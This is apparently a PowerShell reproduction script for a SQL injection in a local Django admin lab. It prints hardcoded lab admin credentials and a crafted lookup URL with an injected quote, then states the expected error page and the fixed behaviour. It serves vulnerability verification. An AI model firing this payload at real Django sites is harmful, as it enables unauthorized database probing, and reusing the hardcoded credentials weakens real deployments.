param(
    [string]$BaseUrl = "http://127.0.0.1:8000"
)

$adminUrl = "$BaseUrl/admin/"
$exploitUrl = "$BaseUrl/admin/vuln/collection/?detail__a%27b=123"

Write-Host "Admin login:"
Write-Host "  $adminUrl"
Write-Host "  Username: admin"
Write-Host "  Password: a123123123"
Write-Host ""
Write-Host "After logging in, open this malicious lookup:"
Write-Host "  $exploitUrl"
Write-Host ""
Write-Host "Expected vulnerable result: a Django database error page."
Write-Host "Expected fixed result: the normal Collection list without an SQL error."

Start-Process $adminUrl

